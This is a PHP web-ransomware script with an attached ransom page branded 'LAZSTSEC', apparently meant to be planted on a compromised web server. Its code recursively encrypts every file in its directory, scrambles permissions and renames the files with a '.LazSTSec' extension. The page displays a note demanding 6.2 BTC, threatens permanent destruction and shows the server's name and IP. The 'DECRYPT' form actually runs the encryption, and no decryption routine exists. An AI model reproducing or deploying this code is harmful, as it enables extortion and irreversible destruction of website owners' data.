<?php
function encryptFile($file, $key) {
    $contents = file_get_contents($file);
    $encrypted = base64_encode(openssl_encrypt($contents, 'AES-256-CBC', $key, 0, substr(hash('sha256', $key), 0, 16)));
    file_put_contents($file, $encrypted);
}

function encryptDirectory($dir, $key) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            if (is_dir($path)) {
                encryptDirectory($path, $key);
            } else {
                encryptFile($path, $key);
                chmod($path, rand(0000, 0777));
                $encryptedName = base64_encode(openssl_encrypt($file, 'AES-256-CBC', $key, 0, substr(hash('sha256', $key), 0, 16)));
                rename($path, $dir . DIRECTORY_SEPARATOR . $encryptedName . '.LazSTSec');
            }
        }
    }
}

function getServerFiles($dir, $count = 4) {
    $files = scandir($dir);
    $result = [];
    $i = 0;
    
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..' && $i < $count) {
            $result[] = $file;
            $i++;
        }
    }
    
    return $result;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = $_POST['prompt'];
    $key = 'www.l99.lzst.com.ru/bitcoin.py';

    if ($input === $key) {
        $directory = __DIR__;
        encryptDirectory($directory, $key);
        echo "<h1 style='color: red;'>ENCRYPTION COMPLETE</h1>";
        exit;
    } else {
        echo "<h1 style='color: red;'>WRONG KEY</h1>";
        exit;
    }
}

$fileList = getServerFiles(__DIR__);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>LAZSTSEC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: black;
            color: white;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 20px;
            overflow: hidden;
        }
        .logo {
            margin: 20px auto;
        }
        .logo img {
            width: 120px;
            height: 120px;
            border: 2px solid red;
            border-radius: 50%;
        }
        .title {
            font-size: 40px;
            color: red;
            text-shadow: 0 0 10px red;
            margin: 10px 0;
        }
        .message {
            font-size: 20px;
            color: white;
            margin: 20px 0;
        }
        .server-info {
            font-size: 14px;
            color: #ccc;
            margin: 20px 0;
            padding: 10px;
            border-top: 1px solid red;
            border-bottom: 1px solid red;
        }
        .file-list {
            font-size: 16px;
            color: #ff5555;
            margin: 20px 0;
            text-align: left;
            width: 300px;
            margin-left: auto;
            margin-right: auto;
        }
        .form-container {
            margin: 30px auto;
        }
        input[type="text"] {
            width: 300px;
            padding: 10px;
            font-size: 16px;
            border: 2px solid red;
            background: black;
            color: white;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background: red;
            color: black;
            border: none;
            margin: 10px;
            cursor: pointer;
        }
        #music-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: black;
            color: red;
            border: 1px solid red;
            padding: 5px 10px;
        }
    </style>
</head>
<body>
    <audio id="bg-music" autoplay loop>
        <source src="https://github.com/FINIXHAWK671/Music/raw/main/%E1%9E%9F%E1%9F%92%E1%9E%9A%E1%9E%B6%E1%9E%98%E1%9E%BD%E1%9E%99%E1%9E%80%E1%9F%82%E1%9E%9C%20_%20new%20melody%202019%20_%20khmer%20remix%202017%20%5B6BDP7QORDYY%5D.mp3" type="audio/mpeg">
    </audio>

    <div class="logo">
        <img src="https://raw.githubusercontent.com/FINIXHAWK671/Music/refs/heads/main/file_00000000292461f8a2542708fa8a7c1a.png" alt="LazSTSec Logo">
    </div>

    <div class="title">
        LAZSTSEC
    </div>

<div class="message" id="typed-message" style="white-space: pre-wrap;"></div>

<script>
    const typedText = `
>> YOUR SYSTEM HAS BEEN COMPROMISED BY LAZSTSEC.
>> TO DECRYPT YOUR FILES:
   - SEND 6.2 BTC TO:
     → bitcoin address hidden (www.l99.lzst.com.ru/bitcoin.py)
   - ENTER THE KEY TO UNLOCK:
     → Same URL above

>> IF YOU FAIL TO COMPLY:
   - YOUR SYSTEM WILL BE DESTROYED PERMANENTLY.
   - FILES WILL BE LOST FOREVER.
   - YOUR DEVICE IS UNDER OUR CONTROL.
`.trim();

    let index = 0;
    const speed = 20;

    function typeMessage() {
        if (index < typedText.length) {
            document.getElementById("typed-message").innerText += typedText.charAt(index);
            index++;
            setTimeout(typeMessage, speed);
        }
    }

    window.onload = typeMessage;
</script>

    <div class="file-list">
        <strong>ENCRYPTED FILES:</strong><br>
        <?php foreach ($fileList as $file): ?>
            • <?php echo htmlspecialchars($file); ?><br>
        <?php endforeach; ?>
    </div>

    <div class="server-info">
        Server: <?php echo $_SERVER['SERVER_NAME']; ?> | 
        IP: <?php echo $_SERVER['SERVER_ADDR']; ?> | 
        Time: <?php echo date('Y-m-d H:i:s'); ?>
    </div>

    <div class="form-container">
        <form method="POST">
            <input type="text" name="prompt" placeholder="Enter key..." required><br>
            <button type="submit">DECRYPT</button>
        </form>
    </div>

    <button id="music-btn" onclick="toggleMusic()">PAUSE</button>

    <script>
        const music = document.getElementById("bg-music");
        const btn = document.getElementById("music-btn");

        function toggleMusic() {
            if (music.paused) {
                music.play();
                btn.textContent = "PAUSE";
            } else {
                music.pause();
                btn.textContent = "PLAY";
            }
        }
    </script>
</body>
</html>